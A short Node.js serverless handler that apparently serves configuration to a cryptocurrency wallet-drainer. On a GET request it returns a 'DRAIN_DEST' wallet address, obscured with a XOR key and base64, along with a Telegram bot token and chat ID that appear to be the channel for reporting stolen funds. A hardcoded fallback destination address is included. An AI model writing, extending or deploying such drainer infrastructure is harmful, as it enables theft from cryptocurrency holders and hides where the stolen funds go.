try { require('dotenv').config(); } catch (e) {}

const XOR_KEY = 'ech3lon';
function xorEnc(str) {
  let out = '';
  for (let i = 0; i < str.length; i++) {
    out += String.fromCharCode(str.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
  }
  return Buffer.from(out, 'binary').toString('base64');
}

module.exports = (req, res) => {
  if (req.method !== 'GET') return res.status(405).end();
  const seed = {
    d: xorEnc(process.env.DRAIN_DEST || 'AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM'),
    tok: process.env.TG_TOK || '',
    chat: process.env.TG_CHAT || ''
  };
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify(seed));
};
